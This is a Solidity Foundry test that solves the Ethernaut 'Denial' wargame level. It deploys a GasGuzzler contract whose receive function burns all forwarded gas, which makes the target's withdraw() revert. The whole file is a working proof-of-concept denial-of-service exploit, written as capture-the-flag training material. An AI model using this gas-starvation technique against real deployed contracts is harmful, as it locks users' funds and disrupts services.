// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Denial} from "../src/levels/Denial.sol";

/// Ethernaut #20 "Denial" → denial-of-service via unbounded gas (no catalog entry). `withdraw()`
/// does `partner.call{value:..}("")` forwarding ALL gas and ignoring the result, so a partner that
/// consumes every forwarded wei of gas starves the rest of the function. Win: `withdraw()` reverts.
contract GasGuzzler {
    receive() external payable {
        assembly {
            invalid() // consume all forwarded gas
        }
    }
}

contract DenialTest is Test {
    function test_solve_denial() public {
        Denial lvl = new Denial();
        vm.deal(address(lvl), 10 ether);

        GasGuzzler g = new GasGuzzler();
        lvl.setWithdrawPartner(address(g));

        // A withdraw with a realistic gas budget runs out of gas (DoS).
        (bool ok,) = address(lvl).call{gas: 100_000}(abi.encodeWithSignature("withdraw()"));
        assertFalse(ok, "withdraw DoS'd by the gas-guzzling partner");
    }
}
